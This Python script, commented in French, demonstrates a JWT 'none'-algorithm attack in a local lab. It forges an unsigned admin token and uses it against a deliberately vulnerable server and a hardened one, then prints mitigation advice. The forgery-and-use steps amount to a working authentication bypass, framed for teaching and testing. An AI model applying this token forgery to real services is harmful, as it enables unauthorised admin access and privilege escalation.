#!/usr/bin/env python3
"""
Script de test de l'attaque JWT "none" sur serveurs vulnérable et sécurisé

Prérequis:
  - Lancer jwt_vulnerable_server.py sur le port 5002
  - Lancer jwt_secure_server.py sur le port 5003
"""

import requests
import json
from jwt_none_attack import create_none_jwt, decode_jwt


def print_section(title):
    """Affiche un titre de section"""
    print()
    print("="*70)
    print(title)
    print("="*70)
    print()


def test_vulnerable_server():
    """Teste l'attaque sur le serveur vulnérable"""
    print_section("TEST 1: SERVEUR VULNÉRABLE (port 5002)")

    base_url = "http://localhost:5002"

    # Étape 1: Login normal
    print("1. Connexion avec compte utilisateur normal")
    print("-" * 70)

    login_data = {
        "username": "user",
        "password": "password"
    }

    try:
        response = requests.post(
            f"{base_url}/login",
            json=login_data,
            headers={'Content-Type': 'application/json'}
        )

        if response.status_code == 200:
            legitimate_token = response.json()['token']
            print(f"Token obtenu: {legitimate_token[:50]}...")

            # Décoder le token
            header, payload, sig = decode_jwt(legitimate_token)
            print(f"\nPayload:")
            print(json.dumps(payload, indent=2))
        else:
            print(f"Erreur de connexion: {response.status_code}")
            return

    except requests.exceptions.ConnectionError:
        print("ERREUR: Serveur vulnérable non accessible sur le port 5002")
        print("Veuillez démarrer: python3 jwt_vulnerable_server.py")
        return

    # Étape 2: Tenter d'accéder à /admin avec token normal
    print()
    print("2. Tentative d'accès admin avec token utilisateur normal")
    print("-" * 70)

    response = requests.get(
        f"{base_url}/admin",
        headers={'Authorization': f'Bearer {legitimate_token}'}
    )

    print(f"Statut: {response.status_code}")
    print(f"Réponse: {response.json()}")

    # Étape 3: Forger un token avec algorithme "none"
    print()
    print("3. Création d'un token forgé avec algorithme 'none'")
    print("-" * 70)

    malicious_payload = {
        "user_id": 1,
        "username": "admin",
        "role": "admin"
    }

    forged_token = create_none_jwt(malicious_payload)
    print(f"Token forgé: {forged_token[:50]}...")
    print(f"\nPayload forgé:")
    print(json.dumps(malicious_payload, indent=2))

    # Étape 4: Utiliser le token forgé
    print()
    print("4. Tentative d'accès admin avec token forgé")
    print("-" * 70)

    response = requests.get(
        f"{base_url}/admin",
        headers={'Authorization': f'Bearer {forged_token}'}
    )

    print(f"Statut: {response.status_code}")
    print(f"Réponse: {json.dumps(response.json(), indent=2)}")

    if response.status_code == 200:
        print()
        print("ATTAQUE RÉUSSIE!")
        print("Le serveur a accepté le token avec algorithme 'none'")
        print("L'attaquant a maintenant un accès admin complet")
    else:
        print()
        print("Attaque bloquée (inattendu pour le serveur vulnérable)")


def test_secure_server():
    """Teste l'attaque sur le serveur sécurisé"""
    print_section("TEST 2: SERVEUR SÉCURISÉ (port 5003)")

    base_url = "http://localhost:5003"

    # Étape 1: Login normal
    print("1. Connexion avec compte utilisateur normal")
    print("-" * 70)

    login_data = {
        "username": "user",
        "password": "password"
    }

    try:
        response = requests.post(
            f"{base_url}/login",
            json=login_data,
            headers={'Content-Type': 'application/json'}
        )

        if response.status_code == 200:
            legitimate_token = response.json()['token']
            print(f"Token obtenu: {legitimate_token[:50]}...")

            # Décoder le token
            header, payload, sig = decode_jwt(legitimate_token)
            print(f"\nPayload:")
            print(json.dumps(payload, indent=2))
        else:
            print(f"Erreur de connexion: {response.status_code}")
            return

    except requests.exceptions.ConnectionError:
        print("ERREUR: Serveur sécurisé non accessible sur le port 5003")
        print("Veuillez démarrer: python3 jwt_secure_server.py")
        return

    # Étape 2: Forger un token avec algorithme "none"
    print()
    print("2. Création d'un token forgé avec algorithme 'none'")
    print("-" * 70)

    malicious_payload = {
        "user_id": 1,
        "username": "admin",
        "role": "admin"
    }

    forged_token = create_none_jwt(malicious_payload)
    print(f"Token forgé: {forged_token[:50]}...")

    # Étape 3: Utiliser le token forgé
    print()
    print("3. Tentative d'accès admin avec token forgé")
    print("-" * 70)

    response = requests.get(
        f"{base_url}/admin",
        headers={'Authorization': f'Bearer {forged_token}'}
    )

    print(f"Statut: {response.status_code}")
    print(f"Réponse: {json.dumps(response.json(), indent=2)}")

    if response.status_code == 401:
        print()
        print("PROTECTION EFFICACE!")
        print("Le serveur a rejeté le token avec algorithme 'none'")
        print("L'attaque a été bloquée")
    else:
        print()
        print("ATTENTION: Le serveur a accepté le token (vulnérabilité)")


def compare_results():
    """Compare les résultats entre les deux serveurs"""
    print_section("COMPARAISON DES RÉSULTATS")

    print("Serveur VULNÉRABLE (port 5002):")
    print("  - Accepte l'algorithme 'none'")
    print("  - Ne vérifie pas la signature")
    print("  - Risque: CRITIQUE")
    print("  - Impact: Élévation de privilèges, bypass authentification")
    print()

    print("Serveur SÉCURISÉ (port 5003):")
    print("  - Whitelist d'algorithmes: ['HS256']")
    print("  - Vérification de signature activée")
    print("  - Risque: Aucun (protégé)")
    print("  - Impact: Attaque bloquée")
    print()

    print("RECOMMANDATIONS:")
    print("  1. Ne JAMAIS accepter l'algorithme 'none' en production")
    print("  2. Toujours spécifier une whitelist d'algorithmes")
    print("  3. Toujours activer verify_signature=True")
    print("  4. Utiliser des bibliothèques JWT à jour")
    print("  5. Ajouter des validations supplémentaires (exp, claims requis)")


if __name__ == "__main__":
    print("="*70)
    print("TEST DE L'ATTAQUE JWT 'NONE' - DÉMONSTRATION COMPLÈTE")
    print("="*70)
    print()
    print("Ce script va tester l'attaque sur deux serveurs:")
    print("  1. Serveur vulnérable (port 5002)")
    print("  2. Serveur sécurisé (port 5003)")
    print()
    print("Assurez-vous que les deux serveurs sont démarrés:")
    print("  Terminal 1: python3 jwt_vulnerable_server.py")
    print("  Terminal 2: python3 jwt_secure_server.py")
    print()

    input("Appuyez sur Entrée pour commencer les tests...")

    # Test du serveur vulnérable
    test_vulnerable_server()

    # Test du serveur sécurisé
    test_secure_server()

    # Comparaison
    compare_results()

    print()
    print("="*70)
    print("TESTS TERMINÉS")
    print("="*70)
